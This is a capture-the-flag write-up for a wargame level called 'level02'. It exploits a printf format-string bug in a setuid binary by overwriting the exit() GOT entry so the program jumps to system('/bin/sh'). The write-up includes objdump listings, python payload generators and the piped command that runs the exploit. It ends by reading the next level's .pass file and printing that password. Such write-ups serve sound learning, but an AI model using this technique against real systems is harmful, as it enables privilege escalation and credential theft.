# Level02

## Setup
 * There is one file in our home, ```level02```, belonging to ```level03``` user, with suid.
 * Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

 * We run the program with gdb and we observe that:
	* `main()` will get 2 user inputs through `fgets()` which is correctly protected
		* 1st user input is of `0x64`
		* 2nd user input is of `0x64`, and ask the user for the password. It's the highest buffer on the `main()` stack 
			* If correct:
				* it will execute `system("/bin/sh")`
			* If incorrect:
				* it uses the 1st input as a `printf format string`
				* and then call `exit()`
	
## Resolution
 * We will use the `format string vulnerability`

 * We want `rip` to become `0x00400a85`, or `4196997` in decimal,  so it executes `system("/bin/sh")`

```sh
objdump -D -M intel ./level02
...
400a85:	bf 32 0d 40 00       	mov    edi,0x400d32
400a8a:	e8 21 fc ff ff       	call   4006b0 <system@plt>
...
```

 * To modify `rip` we want to make use of the `Dynamic Relocation` by changing the address associated with the `jmp`, here it's `0x0000000000601228`

 ```sh
 objdump -R level02

level02:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
...
0000000000601228 R_X86_64_JUMP_SLOT  exit
...
 ```

* With the `format string vulnerabity`, we want to go through multiple arguments with `%lx`. As it's x86_64, we need to take into account the registers used as arguments, there will be a total of `7 arguments to pass`.
* And we will have to write a total of `4196997` characters before using `%n`

 ```sh
python -c "print(                                               
'%016lx' +
'%016lx' +                          
'%016lx' +
'%016lx' +
'%016lx' +
'%016lx' +
'%0' + str(4196997 - (16 * 6)) + 'lx' +
'%n'
)" > /var/crash/level02_1st_arg
 ```

* We then write our address in the 2nd argument:

 ```sh
python -c "print(                                                  
'\x00\x00\x00\x00\x00\x60\x12\x28'[::-1] 
)" > /var/crash/level02_2nd_arg
 ```

 * We can now execute the vulnerability:

 ```sh
cat /var/crash/level02_1st_arg /var/crash/level02_2nd_arg - | ./level02
...
cd ../level03
cat .pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 ```



